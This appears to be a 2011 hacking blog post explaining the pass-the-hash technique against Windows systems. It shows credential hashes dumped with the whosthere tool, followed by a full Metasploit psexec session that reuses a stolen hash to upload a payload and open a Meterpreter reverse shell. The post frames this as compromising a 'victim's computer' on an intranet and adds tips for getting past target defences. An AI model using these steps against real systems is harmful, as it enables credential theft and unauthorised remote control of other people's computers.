---
layout: blog-post
title: "Pass the Hash Exploitation on Windows"
excerpt: Pass the Hash Exploitation on Windows
disqus_id: /2011/08/16/passthehash/
location: Delhi, India
time: 10:00 PM
categories:
- Hacking
- Windows
- Pass The Hash
---

#{{ page.title }}

A Windows 2000/NT/XP/Vista/7 system can be compromised with a technique called [pass the Hash](http://en.wikipedia.org/wiki/Pass_the_hash). For us to exploit this technique, we must know some basica.

In a Windows based authentication such as NTLM or Kerberos, the password is never sent as cleartext. Instead the password is transformed into a hash(LM or NTLM Hash) and then sent to the server. The server then compares this hash against the stored hash and grants/denies the access.

There are two types of hashes:

* [LM hash, LanMan, or LAN Manager hash](http://en.wikipedia.org/wiki/LM_hash): It is the obsolete hashing algorithm. Refer to the link to see how it is computed.
* NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.

Whenever a domain user logs on to the client computer, the hash of its password is stored on the client so that user can be authenticated in future even if the domain controller is not available. There are two types of caching, which is mentioned [here](http://support.microsoft.com/kb/913485).

Now lets suppose, somebody has used your office laptop to log in and access some intranet based sites. Then that user's password hash is stored in your system.

You can retrieve these hashes using a utility such as [PSH Toolkit](http://oss.coresecurity.com/projects/pshtoolkit.htm). It contains a utility **whosthere** which can dump the hashes.

{% highlight text %}
C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt>whosthere-alt.exe
WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com)
 - (c) 2007-2008 Core Security Technologies
This tool lists the active LSA logon sessions with NTLM credentials.
use -h for help.
the output format is: username:domain:lmhash:nthash

madhur:BACKTRACK:123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
BACKTRACK$:WORKGROUP:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
{% endhighlight %}

Once you have grabbed the hash, you can anytime compromise the victim's computer using metaspoilt's psexec module, if you know the IP address, which is not difficult considering an intranet evnironment.

{% highlight text %}
msf exploit(psexec) > use windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.0.13
RHOST => 192.168.0.13
msf exploit(psexec) > set LHOST 192.168.0.14
LHOST => 192.168.0.14
msf exploit(psexec) > set SMBDomain backtrack
SMBDomain => backtrack
msf exploit(psexec) > set SMBUser madhur
SMBUser => madhur
msf exploit(psexec) > set SMBPass 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
SMBPass => 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
msf exploit(psexec) > exploit

[*] Started reverse handler on 192.168.0.13:4444 
[*] Connecting to the server...
[*] Authenticating to 192.168.0.14:445|backtrack as user 'madhur'...
[*] Uploading payload...
[*] Created \wttVwMnA.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (nkgYMOZy - "MrDoYCoO")...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \wttVwMnA.exe...
[*] Sending stage (749056 bytes) to 192.168.0.14
[*] Meterpreter session 6 opened (192.168.0.13:4444 -> 192.168.0.14:1035) at 2011-08-16 22:16:47 +0530

meterpreter > 
{% endhighlight %}

If you have trouble exploiting the target system, then it might be some security enabled your Administrator. For ex

* Simple file sharing is disabled (Windows XP)
* Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)
* "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" on the target systems and setting the value of "RequireSecuritySignature" to "0".

References:
* [http://oss.coresecurity.com/pshtoolkit/doc/index.html](http://oss.coresecurity.com/pshtoolkit/doc/index.html)
* [https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html](https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html)

